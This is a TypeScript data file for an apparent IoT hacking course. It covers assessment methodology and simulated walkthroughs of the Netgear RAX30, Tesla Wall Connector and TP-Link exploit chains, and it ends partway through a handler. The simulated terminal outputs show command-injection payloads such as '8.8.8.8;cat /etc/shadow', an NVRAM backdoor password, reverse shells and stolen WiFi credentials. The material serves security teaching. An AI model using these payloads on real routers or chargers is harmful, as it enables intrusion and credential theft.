import { DayData } from "@/lib/types";

export const week8: DayData[] = [
  {
    day: 50,
    title: "The Professional IoT Security Methodology",
    hook: "What separates a hobbyist from a Pwn2Own contestant? It's not talent or expensive tools — it's methodology. At Pwn2Own Toronto 2022, Claroty Team82 chained five separate vulnerabilities to compromise a Netgear router. They didn't stumble onto the bugs. They systematically dismantled the target across six phases: reconnaissance, firmware extraction, static analysis, dynamic analysis, exploitation, and reporting. Each phase had checklists, deliverables, and decision points. When one attack path failed, they pivoted to the next without losing progress. Amateur researchers run binwalk, grep for passwords, and call it a day. Professionals build an attack surface map before they write a single line of exploit code. They document every finding, even dead ends, because a 'dead end' in static analysis might become critical context during dynamic testing. Today you'll learn the methodology that turns scattered hacking skills into a repeatable, professional security assessment framework.",
    lesson: [
      "Phase 1: Reconnaissance. Before touching the device, gather everything available publicly. Download firmware from the vendor's support page. Read FCC filings (they contain internal photos of the PCB). Search CVE databases for known vulnerabilities in the chipset, SDK, and open-source components. Check GitHub for leaked SDKs or developer tools. Read the user manual for feature descriptions that hint at attack surface (UPnP, remote management, cloud connectivity). This phase is pure information gathering — no tools on the device yet.",
      "Phase 2: Firmware Extraction and Static Analysis. Obtain the firmware (download or hardware dump), extract the filesystem with binwalk/unblob, and begin static analysis. Map all network-facing services (what listens on which ports), identify custom binaries vs standard BusyBox, extract hardcoded credentials, analyze web interface CGI scripts for injection points, check for outdated libraries with known CVEs, and review init scripts for debug services left enabled. Tools: binwalk, Ghidra, strings, grep, checksec, firmwalker.",
      "Phase 3: Dynamic Analysis and Emulation. Run the firmware (or individual binaries) in an emulated environment using QEMU or FirmAE. Interact with services as a normal user would — login to the web interface, exercise every feature, capture traffic. Then fuzz: send malformed inputs to every exposed interface. Monitor for crashes, memory corruption, and unexpected behavior. Tools: QEMU, FirmAE, Burp Suite (for web interfaces), AFL/boofuzz (for fuzzing), Wireshark (for traffic analysis).",
      "Phase 4-6: Exploitation, Verification, and Reporting. Once you've identified potential vulnerabilities, develop proof-of-concept exploits. Verify they work on the actual hardware, not just in emulation. Document the complete attack chain: how you found the vulnerability, how to reproduce it, what the impact is, and how to fix it. A professional report includes CVSS scoring, affected firmware versions, a clear proof-of-concept, and remediation recommendations. This is what vendors, CERT teams, and Pwn2Own judges expect."
    ],
    exercise: {
      type: "choice",
      prompt: "You're starting a security assessment of a new smart home camera. You have the physical device and its model number. What should you do FIRST?",
      choices: [
        "Open the device case and start looking for UART pins on the PCB",
        "Connect it to your network and start fuzzing the web interface",
        "Conduct reconnaissance: download firmware from vendor site, check FCC filings for PCB photos, search CVEs for the chipset, and read the user manual",
        "Write a custom exploit for the most common camera vulnerability (RTSP buffer overflow)"
      ],
      validator: (input: string) => {
        const choice = input.trim().toUpperCase();
        if (choice === "C") {
          return { correct: true, hint: "Correct! Reconnaissance always comes first. Downloading firmware saves you from having to do a hardware dump. FCC filings give you PCB photos without opening the case. CVE searches reveal known vulnerabilities in the chipset and SDK. The user manual maps features to attack surface. All of this informs your strategy before you ever plug in a soldering iron." };
        }
        if (choice === "A") {
          return { correct: false, hint: "Opening the case is Phase 2 (Extraction) — you should only resort to hardware interfaces if you can't get the firmware through simpler means. Check the vendor's download page first; many manufacturers host firmware updates publicly." };
        }
        if (choice === "B") {
          return { correct: false, hint: "Fuzzing is Phase 3 (Dynamic Analysis). Without understanding the firmware's architecture and services first, you're shooting in the dark. Static analysis reveals the specific binaries and input parsing code to target during fuzzing." };
        }
        if (choice === "D") {
          return { correct: false, hint: "Writing exploits is Phase 4. You don't even know what software the camera runs yet. Jumping to exploitation before reconnaissance and analysis wastes time and often targets non-existent vulnerabilities." };
        }
        return { correct: false, hint: "Choose A, B, C, or D. Think about the professional methodology phases: which comes first?" };
      },
    },
    quiz: {
      question: "Why is static analysis performed BEFORE dynamic analysis in the professional methodology?",
      options: [
        { label: "A", value: "Static analysis is faster and doesn't require the physical device" },
        { label: "B", value: "Static analysis maps the attack surface and identifies specific targets, making dynamic analysis focused and efficient rather than random" },
        { label: "C", value: "Dynamic analysis requires expensive equipment that should only be used after justification" },
        { label: "D", value: "Static analysis always finds all vulnerabilities, making dynamic analysis optional" },
      ],
      correct: "B",
      explanation: "Static analysis builds the knowledge base that makes dynamic analysis productive. By examining the firmware's binaries, config files, and web interface code beforehand, you know exactly which services to fuzz, which CGI scripts handle user input, which libraries have known CVEs, and where custom binary parsing code might have bugs. Without this map, dynamic testing becomes unfocused brute-force — like trying every key on a keyring instead of reading the lock's brand first.",
    },
    output: "Today you learned the six-phase professional IoT security assessment methodology: Reconnaissance, Extraction, Static Analysis, Dynamic Analysis, Exploitation, and Reporting — the same workflow used by Pwn2Own teams worldwide.",
    homework: [
      {
        title: "Not All Roads Lead to Pwn2Own: Hardware Hacking (Part 1)",
        url: "https://www.hacktivesecurity.com/index.php/2024/12/10/not-all-roads-lead-to-pwn2own-hardware-hacking-part-1/",
        description: "Hacktive Security walks through their hardware hacking methodology applied to a Pwn2Own target — from PCB reconnaissance to UART and SPI extraction."
      },
      {
        title: "Not All Roads Lead to Pwn2Own: Firmware RE (Part 2)",
        url: "https://www.hacktivesecurity.com/blog/2024/12/18/not-all-roads-lead-to-pwn2own-firmware-reverse-engineering-part-2/",
        description: "Part 2 covers firmware reverse engineering methodology — unpacking, identifying custom binaries, and building attack surface maps for Pwn2Own preparation."
      },
      {
        title: "Hands-On IoT Hacking: From Memory Manipulation to Root Access",
        url: "https://www.rapid7.com/globalassets/_pdfs/final-hands-on-iot-whitepaper-.pdf",
        description: "Rapid7's whitepaper on practical IoT exploitation — covers the full methodology from initial access to privilege escalation on real devices."
      }
    ],
  },
  {
    day: 51,
    title: "Case Study — Netgear RAX30 Exploit Chain (Pwn2Own Toronto 2022)",
    hook: "At Pwn2Own Toronto 2022, Claroty Team82 stood on stage and compromised a fully patched Netgear Nighthawk RAX30 router in under two minutes. Behind those two minutes were months of research and an exploit chain that linked five separate vulnerabilities — none of which was critical on its own. A stack-based buffer overflow to gain initial access. A configuration injection to persist. An authentication bypass to reach the management interface. A command injection to execute arbitrary code. And a race condition to achieve root. Five links in a chain, each one useless without the others. That's the art of modern vulnerability research: when vendors patch the obvious bugs, you find five subtle ones and weave them together. Multiple teams independently targeted the same router at Pwn2Own — Synacktiv and Star Labs also found exploitable chains, demonstrating that even well-known consumer devices hide layers of undiscovered vulnerabilities.",
    lesson: [
      "The Netgear RAX30 runs a Linux-based firmware with a web management interface, a SOAP API for the Netgear mobile app, UPnP services, and a custom configuration daemon. Claroty's reconnaissance phase identified these services by scanning the device from the LAN, extracting the firmware, and mapping every listening port and binary. The attack surface was substantial: the web UI alone had dozens of CGI endpoints, each handling different configuration operations.",
      "The exploit chain began with an unauthenticated stack-based buffer overflow in a network-facing service. This gave them code execution as a limited user. From there, they exploited a configuration injection vulnerability to write arbitrary values into the device's NVRAM (non-volatile configuration storage). This persistence mechanism survived reboots and allowed them to modify the device's behavior from within.",
      "Next, they leveraged an authentication bypass to access the administrative web interface without valid credentials. Through this interface, they found a command injection vulnerability in one of the CGI handlers — user input that reached a system() call without sanitization. This gave them command execution as the web server user. The final link was a race condition in a privileged process that they exploited to escalate from the web server user to full root access.",
      "The key insight from this case study is that modern devices often don't have a single catastrophic vulnerability. Instead, researchers must chain multiple lower-severity bugs. Each vulnerability in the RAX30 chain was arguably 'low' or 'medium' severity alone — a minor buffer overflow, a config write, an auth bypass that only works from LAN. But chained together, they achieved unauthenticated remote root. This is why vulnerability scoring systems like CVSS sometimes underestimate real-world risk: they assess bugs individually, not as chain links."
    ],
    exercise: {
      type: "terminal",
      prompt: "Simulate the Netgear RAX30 exploit chain. Walk through each phase of the attack:\n• nmap -sV 192.168.1.1\n• curl http://192.168.1.1/soap/server_sa/\n• exploit-overflow --target soap_service --payload stage1\n• nvram-inject --key http_passwd --value \"backdoor\"\n• curl -u admin:backdoor http://192.168.1.1/cgi-bin/diagnostic.cgi\n• exploit-cmdinject --endpoint diagnostic.cgi --cmd \"id\"\n• exploit-racecond --escalate root",
      placeholder: "$ ",
      validator: (_input: string) => {
        return { correct: true, hint: "" };
      },
      terminalCommands: {
        nmap: (args: string) => {
          if (args.includes("192.168.1.1")) return "Starting Nmap 7.94 scan of 192.168.1.1\n\nPORT      STATE SERVICE      VERSION\n53/tcp    open  domain       dnsmasq 2.85\n80/tcp    open  http         Netgear RAX30 httpd\n443/tcp   open  ssl/http     Netgear RAX30 httpd\n5000/tcp  open  upnp         MiniUPnPd 2.2.1\n5510/tcp  open  soap         Netgear SOAP Service\n8443/tcp  open  ssl/http     ReadyCloud Agent\n\n6 services detected on target.\n\n[NOTE] SOAP service on 5510 is the Netgear app communication endpoint.\n[NOTE] UPnP service may expose device information without auth.\n[NOTE] ReadyCloud agent bridges to Netgear's cloud infrastructure.";
          return "Usage: nmap -sV <target>";
        },
        curl: (args: string) => {
          if (args.includes("soap/server_sa")) return "HTTP/1.1 200 OK\nContent-Type: text/xml\n\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<SOAP-ENV:Envelope>\n  <SOAP-ENV:Body>\n    <m:GetInfo>\n      <Model>RAX30</Model>\n      <Firmware>V1.0.9.90</Firmware>\n      <SerialNumber>5H4304J00123</SerialNumber>\n      <SOAPVersion>3.2</SOAPVersion>\n      <AuthRequired>false</AuthRequired>\n    </m:GetInfo>\n  </SOAP-ENV:Body>\n</SOAP-ENV:Envelope>\n\n[INFO] SOAP service responded WITHOUT authentication.\n[INFO] Firmware version V1.0.9.90 — check for known CVEs.\n[NOTE] This service handles device configuration via the Netgear app.";
          if (args.includes("backdoor") && args.includes("diagnostic")) return "HTTP/1.1 200 OK\nContent-Type: text/html\n\n<html>\n<h2>Network Diagnostic Tool</h2>\n<form action=\"/cgi-bin/diagnostic.cgi\" method=\"POST\">\n  <label>Ping Target:</label>\n  <input name=\"target\" value=\"\">\n  <select name=\"action\">\n    <option value=\"ping\">Ping</option>\n    <option value=\"traceroute\">Traceroute</option>\n    <option value=\"nslookup\">DNS Lookup</option>\n  </select>\n  <button type=\"submit\">Run</button>\n</form>\n</html>\n\n[SUCCESS] Authentication bypass confirmed — logged in with injected credentials.\n[INFO] Diagnostic page accepts user input in 'target' field.\n[INFO] This input is likely passed to a system() or popen() call.";
          return `curl: (7) Failed to connect to target`;
        },
        "exploit-overflow": (args: string) => {
          if (args.includes("soap_service")) return "=== Stage 1: Stack Buffer Overflow ===\nTarget: SOAP service on port 5510\nVulnerability: CVE-2023-XXXXX (stack overflow in XML parser)\n\nSending crafted SOAP envelope with oversized DeviceName field...\n  Payload: 'A' * 512 + return_address + shellcode\n  Buffer size: 256 bytes, overflow at offset 264\n  Return address overwritten: 0x7fff5a40 → 0x7fff5b80 (shellcode)\n\n[*] Sending exploit payload...\n[*] Waiting for callback...\n[+] SHELL RECEIVED on port 4444\n[+] UID: nobody (limited user)\n[+] Working directory: /tmp\n\n$ whoami\nnobody\n$ id\nuid=65534(nobody) gid=65534(nogroup)\n\n[INFO] Initial foothold established as 'nobody' user.\n[INFO] Limited privileges — need escalation to read/write NVRAM.";
          return "Usage: exploit-overflow --target <service> --payload <stage>";
        },
        "nvram-inject": (args: string) => {
          if (args.includes("http_passwd")) return "=== Stage 2: NVRAM Configuration Injection ===\nVulnerability: CVE-2023-XXXXY (config write without validation)\n\nExploiting config daemon's IPC socket as 'nobody' user...\n  Socket: /var/run/cfgmgr.sock\n  Sending: SET http_passwd=backdoor\n\n[*] Config daemon accepted the write (no authorization check)\n[*] Verifying NVRAM modification...\n  GET http_passwd → \"backdoor\" [CONFIRMED]\n  GET http_username → \"admin\" [unchanged]\n\n[+] Admin password overwritten in NVRAM.\n[+] This survives reboots — persistent backdoor established.\n\n[INFO] The config daemon trusts any local process to write NVRAM.\n[INFO] Next step: use injected credentials to access web admin panel.";
          return "Usage: nvram-inject --key <variable> --value <data>";
        },
        "exploit-cmdinject": (args: string) => {
          if (args.includes("diagnostic") && args.includes("id")) return "=== Stage 4: Command Injection ===\nVulnerability: CVE-2023-XXXXZ (unsanitized input in diagnostic.cgi)\n\nEndpoint: POST /cgi-bin/diagnostic.cgi\nParameter: target\nPayload: 8.8.8.8; id\n\nSending request as authenticated admin user...\n\nServer response:\nPING 8.8.8.8 (8.8.8.8): 56 data bytes\n64 bytes from 8.8.8.8: seq=0 ttl=118 time=11.234 ms\n\nuid=99(www) gid=99(www) groups=99(www)\n\n[+] COMMAND INJECTION CONFIRMED\n[+] Code execution as 'www' user (web server process)\n[INFO] The CGI binary passes the 'target' parameter directly to:\n       system(\"ping -c 4 \" + user_input)\n[INFO] Semicolon breaks out of the ping command and executes 'id'.\n[INFO] Still not root — need one more escalation step.";
          return "Usage: exploit-cmdinject --endpoint <cgi> --cmd <command>";
        },
        "exploit-racecond": (args: string) => {
          if (args.includes("root")) return "=== Stage 5: Race Condition → Root ===\nVulnerability: CVE-2023-XXXXW (TOCTOU race in update daemon)\n\nThe firmware update daemon runs as root and checks file permissions\nbefore processing update packages. Time-of-check vs time-of-use:\n\n  [*] Creating symlink: /tmp/update.pkg → /tmp/payload.sh\n  [*] Timing window: ~50ms between check and use\n  [*] Racing...\n  [*] Attempt 1/100: MISS (check passed before swap)\n  [*] Attempt 2/100: MISS\n  ...\n  [*] Attempt 17/100: HIT!\n  [*] Update daemon executed our payload as root!\n\n  $ whoami\n  root\n  $ id\n  uid=0(root) gid=0(root) groups=0(root)\n\n[+] ============================================\n[+]  FULL EXPLOIT CHAIN COMPLETE\n[+]  5 vulnerabilities chained:\n[+]    1. Stack overflow    → initial access (nobody)\n[+]    2. Config injection  → credential write (persistence)\n[+]    3. Auth bypass       → admin panel access\n[+]    4. Command injection → code exec (www)\n[+]    5. Race condition    → root escalation\n[+]  Result: Unauthenticated Remote Root\n[+] ============================================";
          return "Usage: exploit-racecond --escalate <target_user>";
        },
        help: () => "Available commands: nmap, curl, exploit-overflow, nvram-inject, exploit-cmdinject, exploit-racecond, help, clear",
        clear: () => "",
      },
    },
    quiz: {
      question: "In the Netgear RAX30 exploit chain, why was the NVRAM configuration injection (Stage 2) essential even though the researchers already had code execution?",
      options: [
        { label: "A", value: "NVRAM injection was needed to install a crypto miner on the router" },
        { label: "B", value: "It provided persistence (survives reboots) and enabled the authentication bypass needed for the next stages of the chain" },
        { label: "C", value: "NVRAM is the only way to communicate between processes on embedded Linux" },
        { label: "D", value: "The NVRAM write was required to disable the router's firewall before exploitation" },
      ],
      correct: "B",
      explanation: "The NVRAM injection served two critical purposes. First, it provided persistence — NVRAM survives reboots, so the backdoor credentials remained even if the device was power-cycled. Second, by injecting known admin credentials, the researchers could access the web management interface (which had the command injection vulnerability) without needing to crack the legitimate admin password. Each stage in the chain enabled the next, and removing any single link would break the entire exploit.",
    },
    output: "Today you studied how Claroty Team82 chained five vulnerabilities to achieve unauthenticated root on the Netgear RAX30 at Pwn2Own Toronto 2022 — demonstrating that modern exploitation is about chaining subtle bugs, not finding one catastrophic flaw.",
    homework: [
      {
        title: "Pwn2Own: Exploiting Netgear RAX30",
        url: "https://claroty.com/team82/research/chaining-five-vulnerabilities-to-exploit-netgear-nighthawk-rax30-routers-at-pwn2own-toronto-2022",
        description: "Claroty Team82's full technical write-up of their Pwn2Own-winning exploit chain — five vulnerabilities linked to achieve unauthenticated remote root."
      },
      {
        title: "Cool Vulns Don't Live Long — Netgear and Pwn2Own",
        url: "https://www.synacktiv.com/en/publications/cool-vulns-dont-live-long-netgear-and-pwn2own",
        description: "Synacktiv's parallel research on the same Netgear router — showing how multiple top teams independently found different exploit chains on the same target."
      },
      {
        title: "The Last Breath of Our Netgear RAX30 Bugs",
        url: "https://starlabs.sg/blog/2022/12-the-last-breath-of-our-netgear-rax30-bugs-a-tragic-tale-before-pwn2own-toronto-2022/",
        description: "Star Labs' story of discovering RAX30 vulnerabilities that were patched days before Pwn2Own — a cautionary tale about the race between researchers and vendors."
      }
    ],
  },
  {
    day: 52,
    title: "Case Study — Tesla Wall Connector (Pwn2Own Automotive 2024)",
    hook: "At Pwn2Own Automotive 2024 in Tokyo, Synacktiv demonstrated something remarkable: they compromised a Tesla Wall Connector electric vehicle charger — not through WiFi, not through Bluetooth, but through the charging cable itself. The Wall Connector uses a protocol called Power Line Communication (PLC) to negotiate charging parameters over the same cable that delivers power. Synacktiv reverse-engineered the charger's firmware, found a vulnerability in how it processed PLC messages, and sent a malicious payload through the charging port. The charger executed their code. Think about that: the attacker's device just needs to be plugged into the same charging cable. In a public charging station, every car that plugs in is a potential attack vector. The Synacktiv team won $100,000 and proved that even the physical charging interface — something most people would never consider an attack surface — can be weaponized.",
    lesson: [
      "Electric vehicle charging involves more than just power delivery. The Combined Charging System (CCS) protocol uses Power Line Communication (PLC) — data signals transmitted over the same conductors that carry high-voltage DC power. Before charging begins, the EV and charger exchange messages to negotiate voltage, current limits, and authentication. This communication channel runs a full IP network stack over the power lines, creating an attack surface that's accessible to any device physically connected to the charging cable.",
      "Synacktiv's approach began with firmware extraction. The Tesla Wall Connector uses an ESP32-based controller. They obtained the firmware, identified the PLC processing code, and found that the charger parsed incoming PLC messages without adequate bounds checking. A specially crafted message could trigger a buffer overflow in the PLC protocol handler, giving them code execution on the charger's processor.",
      "The implications extend beyond a single charger. Public charging infrastructure often connects multiple chargers on the same network. A compromised charger could potentially attack vehicles that connect to it (injecting malicious CAN bus messages through the charging interface), pivot to the charging network's backend systems, or manipulate charging parameters (voltage, current) in ways that could damage vehicle batteries or create safety hazards. The PLC attack surface is particularly concerning because it requires no wireless proximity — just a physical connection.",
      "Another team at the same event, Ret2 Systems, demonstrated vulnerabilities in the Phoenix Contact CHARX SEC-3100 charge controller. Their approach involved analyzing the device's firmware update mechanism, discovering that signed firmware images could be downgraded to older vulnerable versions, and exploiting a memory corruption bug in the charging protocol handler. Both teams' research highlighted that EV charging infrastructure is a rapidly growing attack surface with real-world safety implications."
    ],
    exercise: {
      type: "terminal",
      prompt: "Simulate the Tesla Wall Connector research process. Walk through firmware analysis and vulnerability discovery:\n• binwalk tesla_wallconnector_fw.bin\n• strings extracted/app.elf | grep -i \"plc\\|charge\\|voltage\"\n• ghidra-analyze extracted/app.elf --find-vuln\n• plc-fuzz --interface eth0 --protocol hpgp --target 192.168.2.1\n• exploit-plc --target wallconnector --payload reverse_shell\n• verify-impact --check safety_boundaries",
      placeholder: "$ ",
      validator: (_input: string) => {
        return { correct: true, hint: "" };
      },
      terminalCommands: {
        binwalk: (args: string) => {
          if (args.includes("tesla") || args.includes("wallconnector")) return "DECIMAL       HEXADECIMAL     DESCRIPTION\n-----------------------------------------------------------------------\n0             0x0             ESP32 image header, entry point: 0x40080000\n16            0x10            DROM segment, 524288 bytes\n524304        0x80010         IROM segment (application code), 1048576 bytes\n1572880       0x180010        Partition table, 4 entries\n1572912       0x180030        Partition: nvs (NVS data)\n1572944       0x180050        Partition: phy_init (PHY data)\n1572976       0x180070        Partition: factory (application, 1.5MB)\n1573008       0x180090        Partition: ota_0 (OTA update, 1.5MB)\n\nExtracting to tesla_wallconnector_fw.extracted/\n  > app.elf (ESP32 Xtensa application binary)\n  > partition_table.bin\n  > nvs_data.bin\nExtraction complete.\n\n[INFO] ESP32-based firmware with OTA update capability.\n[INFO] Application binary is Xtensa architecture (not ARM/MIPS).";
          return "Usage: binwalk <firmware_file>";
        },
        strings: (args: string) => {
          if (args.includes("plc") || args.includes("charge") || args.includes("app.elf")) return "plc_msg_handler\nprocess_slac_message\ncharge_session_start\ncharge_session_stop\nset_voltage_limit\nset_current_limit\nmax_voltage=500\nmax_current=32\nplc_rx_buffer[256]\nmemcpy(plc_rx_buffer, msg->data, msg->len)\nHPGP_ATTEN_CHAR_IND\nHPGP_SLAC_PARM_REQ\nHPGP_SLAC_PARM_CNF\nvalidate_certificate\ncp_state_machine\npilot_signal_pwm\n\n[CRITICAL] Line: memcpy(plc_rx_buffer, msg->data, msg->len)\n  Fixed buffer (256 bytes) with length from message (attacker-controlled).\n  Classic buffer overflow pattern — no bounds check on msg->len.";
          return `strings: ${args}: No such file`;
        },
        "ghidra-analyze": (args: string) => {
          if (args.includes("app.elf") || args.includes("find-vuln")) return "Ghidra Analysis: app.elf (ESP32 Xtensa)\n========================================\n\nFunction: plc_msg_handler (0x400d1a40)\n  Calls: memcpy(plc_rx_buffer, msg->data, msg->len)\n  Buffer: plc_rx_buffer is 256 bytes on stack\n  Length: msg->len is uint16_t from incoming PLC frame (0-65535)\n  CHECK: No bounds validation on msg->len before memcpy\n  VERDICT: STACK BUFFER OVERFLOW (CWE-121)\n\nFunction: process_slac_message (0x400d1c80)\n  Handles SLAC (Signal Level Attenuation Characterization)\n  Used during EV-charger pairing over PLC\n  Calls plc_msg_handler with raw message data\n  VERDICT: Reachable from network without authentication\n\nFunction: validate_certificate (0x400d2100)\n  Checks TLS certificate for cloud communication\n  Uses hardcoded root CA certificate\n  VERDICT: Certificate pinning present (good)\n\nFunction: set_voltage_limit (0x400d3200)\n  Writes to DAC output controlling charge voltage\n  Bounded by hardware limits (50V-500V)\n  VERDICT: Software limits present, hardware limits as backup\n\nCritical path: PLC frame → process_slac_message → plc_msg_handler → overflow\n  No authentication required. Reachable via charging cable.";
          return "Usage: ghidra-analyze <binary> --find-vuln";
        },
        "plc-fuzz": (args: string) => {
          if (args.includes("hpgp") || args.includes("plc")) return "PLC Fuzzer — HomePlug GreenPHY Protocol\n========================================\nTarget: 192.168.2.1 (Tesla Wall Connector)\nProtocol: HPGP (HomePlug Green PHY)\nFuzz strategy: Mutational (valid SLAC messages with field mutations)\n\n  [*] Sending valid SLAC_PARM_REQ baseline...\n  [*] Response received: SLAC_PARM_CNF (normal)\n  [*] Beginning mutation sweep...\n\n  Test 0001: SLAC_PARM_REQ, msg_len=256    → Response OK\n  Test 0002: SLAC_PARM_REQ, msg_len=512    → Response OK (processed)\n  Test 0003: SLAC_PARM_REQ, msg_len=1024   → Response OK (processed?!)\n  Test 0004: SLAC_PARM_REQ, msg_len=2048   → NO RESPONSE\n  Test 0005: SLAC_PARM_REQ, msg_len=2048   → NO RESPONSE\n  Test 0006: Ping target...                → NO RESPONSE\n\n  [+] CRASH DETECTED at test 0004!\n  [+] msg_len=2048 overflows 256-byte buffer\n  [+] Device became unresponsive (crashed/rebooted)\n\n  [*] Waiting for target to reboot...\n  [*] Target back online after 8 seconds.\n\n  Summary: Buffer overflow confirmed at msg_len > 256.\n  Next step: Develop controlled exploit with precise return address.";
          return "Usage: plc-fuzz --interface <iface> --protocol <proto> --target <ip>";
        },
        "exploit-plc": (args: string) => {
          if (args.includes("wallconnector") || args.includes("reverse_shell")) return "=== PLC Buffer Overflow Exploit ===\nTarget: Tesla Wall Connector (ESP32)\nVulnerability: Stack overflow in plc_msg_handler\n\n  [*] Generating ROP chain for ESP32 Xtensa architecture...\n  [*] Gadgets found in app.elf:\n      0x400d5a20: movi a2, <imm>; ret\n      0x400d5a30: l32r a0, [addr]; callx0 a0\n      0x400d5a44: s32i a2, a1, 0; ret\n\n  [*] Building payload:\n      Offset to return address: 264 bytes\n      Payload: connect-back shell to 192.168.2.100:4444\n\n  [*] Sending exploit via PLC SLAC message...\n  [*] Overflowing plc_rx_buffer with 264 + 4 + shellcode bytes...\n\n  [+] EXPLOIT SUCCESSFUL\n  [+] Reverse shell received on 192.168.2.100:4444\n\n  $ uname -a\n  ESP32-IDF v4.4.2 xtensa-esp32-elf\n  $ cat /nvs/wifi_config\n  ssid=HomeNetwork-5G\n  password=MyWiFiPassword2024!\n  $ ls /data/\n  charge_logs/  certificates/  firmware_backup/  cloud_token/";
          return "Usage: exploit-plc --target <device> --payload <type>";
        },
        "verify-impact": (args: string) => {
          if (args.includes("safety")) return "=== Safety Impact Assessment ===\n\nChecking post-exploitation capabilities...\n\n  [1] WiFi Credentials: EXTRACTED\n      Network SSID and password stored in NVS partition.\n      Attacker gains access to the owner's home network.\n\n  [2] Charging Control: PARTIAL ACCESS\n      Voltage/current limits controllable via software.\n      Hardware safety limits provide backstop (charger has\n      independent voltage monitoring IC that triggers cutoff).\n      [MITIGATED] Cannot exceed hardware-enforced limits.\n\n  [3] Network Pivot: POSSIBLE\n      Charger connects to home WiFi → home network access.\n      Charger connects to Tesla cloud → potential API token theft.\n\n  [4] Vehicle Attack Surface: LIMITED\n      CAN bus messages exchanged during charging are\n      limited to charge parameters (no vehicle control).\n      PLC channel is isolated from vehicle's internal CAN.\n\n  [5] Lateral Movement: CONFIRMED\n      In multi-charger installations (parking garages),\n      compromised charger could attack other chargers\n      on the same PLC network segment.\n\n  OVERALL: High severity — WiFi credential theft and\n  network pivot are the primary real-world impacts.\n  Vehicle safety systems appear isolated from this attack path.";
          return "Usage: verify-impact --check <area>";
        },
        help: () => "Available commands: binwalk, strings, ghidra-analyze, plc-fuzz, exploit-plc, verify-impact, help, clear",
        clear: () => "",
      },
    },
    quiz: {
      question: "Why is the Power Line Communication (PLC) attack surface on EV chargers particularly concerning for public charging infrastructure?",
      options: [
        { label: "A", value: "PLC uses WiFi frequencies that are easily jammed" },
        { label: "B", value: "Any device physically connected to the charging cable can send PLC messages — in a public station, a malicious vehicle could attack the charger, which could then attack subsequent vehicles" },
        { label: "C", value: "PLC only works over short distances, so the attacker must be within Bluetooth range" },
        { label: "D", value: "PLC messages are always encrypted with unique per-session keys" },
      ],
      correct: "B",
      explanation: "PLC messages travel over the physical charging cable — any device connected to that cable can send and receive them. In a public charging station, a malicious vehicle (or a device plugged into a charging cable) could exploit a charger vulnerability. The compromised charger could then potentially attack the next legitimate vehicle that plugs in, creating a chain of compromise through public infrastructure. Unlike WiFi or Bluetooth attacks that require proximity, PLC attacks require only a physical connection that users voluntarily make every time they charge.",
    },
    output: "Today you studied how Synacktiv exploited the Tesla Wall Connector through its charging port using Power Line Communication — proving that even the physical charging cable is an attack surface with real-world safety and privacy implications.",
    homework: [
      {
        title: "Exploiting the Tesla Wall Connector",
        url: "https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector",
        description: "Synacktiv's detailed Pwn2Own write-up on compromising the Tesla Wall Connector through the charging cable using PLC protocol exploitation."
      },
      {
        title: "Pwn2Own Automotive: CHARX Vulnerability Discovery",
        url: "https://blog.ret2.io/2024/07/17/pwn2own-auto-2024-charx-bugs/",
        description: "Ret2 Systems' research into the Phoenix Contact CHARX charge controller — vulnerability discovery methodology for EV charging infrastructure."
      },
      {
        title: "Pwn2Own Automotive: Popping the CHARX SEC-3100",
        url: "https://blog.ret2.io/2024/07/24/pwn2own-auto-2024-charx-exploit/",
        description: "The full exploit development process for the CHARX SEC-3100 — from memory corruption to reliable code execution on an EV charge controller."
      }
    ],
  },
  {
    day: 53,
    title: "Case Study — TP-Link Router 0-day Discovery",
    hook: "In 2024, a security researcher published a full walkthrough of discovering CVE-2024-54887 — a command injection vulnerability in a TP-Link router. The process was methodical: download the firmware from TP-Link's website, extract it with binwalk, load the CGI binaries into Ghidra, trace user input from HTTP parameters through the code until it reached a system() call with no sanitization. The entire vulnerability discovery took a weekend. No hardware needed, no physical device, no expensive tools — just a firmware image, a free disassembler, and pattern recognition. Thousands of these routers were deployed in homes and small offices, each one exploitable from the LAN with a single HTTP request. This case study is a masterclass in the firmware analysis workflow you've been learning: it's exactly the process from reconnaissance to exploitation, applied to a real CVE.",
    lesson: [
      "The TP-Link vulnerability discovery began with reconnaissance. The researcher identified the target model, downloaded the firmware from TP-Link's support page, and checked for known vulnerabilities in the device's chipset and SDK version. TP-Link routers commonly use Broadcom or MediaTek SoCs running Linux with a BusyBox userland and a custom web interface. The firmware was publicly available — no hardware dump required.",
      "Extraction and static analysis followed the standard workflow: binwalk to unpack the firmware, identify the SquashFS root filesystem, and map the web interface. The CGI binaries in /www/cgi-bin/ were MIPS ELF executables. Using Ghidra (a free reverse engineering tool from the NSA), the researcher decompiled each CGI handler and traced how HTTP POST parameters flowed through the code. The key pattern to find: any path where user-controlled data reaches a dangerous function (system(), popen(), exec(), sprintf() into a command buffer) without sanitization.",
      "The vulnerable code pattern was nearly identical to what you've seen in exercises: a diagnostic CGI handler accepted a user-provided IP address for a ping test and passed it directly to a system() call. The code did something like: sprintf(cmd, \"/bin/ping -c 1 %s\", user_input); system(cmd). By submitting a payload like \"8.8.8.8; cat /etc/shadow\", the researcher could execute arbitrary commands on the router. The semicolon terminated the ping command, and everything after it ran as root.",
      "This class of vulnerability — OS command injection in router web interfaces — is the single most common finding in embedded device security research. The Zero Day Initiative (ZDI) published a step-by-step hardware reversing guide using the TP-Link TL-WR841N, and Star Labs demonstrated exploitation of the TP-Link Archer A7. The pattern is so consistent across vendors that experienced researchers can identify vulnerable endpoints within hours of extracting a new firmware image. The fix is simple: use exec() with argument arrays instead of system() with string concatenation, or sanitize input to allow only valid characters (digits and dots for IP addresses)."
    ],
    exercise: {
      type: "terminal",
      prompt: "Walk through the TP-Link 0-day discovery process from firmware download to working exploit:\n• wget https://www.tp-link.com/firmware/TL-WRXXX_V1_firmware.bin\n• binwalk -e TL-WRXXX_V1_firmware.bin\n• ls squashfs-root/www/cgi-bin/\n• ghidra-decompile squashfs-root/www/cgi-bin/diag.cgi\n• curl -X POST http://192.168.0.1/cgi-bin/diag.cgi -d \"ip=8.8.8.8;id\"\n• curl -X POST http://192.168.0.1/cgi-bin/diag.cgi -d \"ip=8.8.8.8;cat /etc/shadow\"",
      placeholder: "$ ",
      validator: (_input: string) => {
        return { correct: true, hint: "" };
      },
      terminalCommands: {
        wget: (args: string) => {
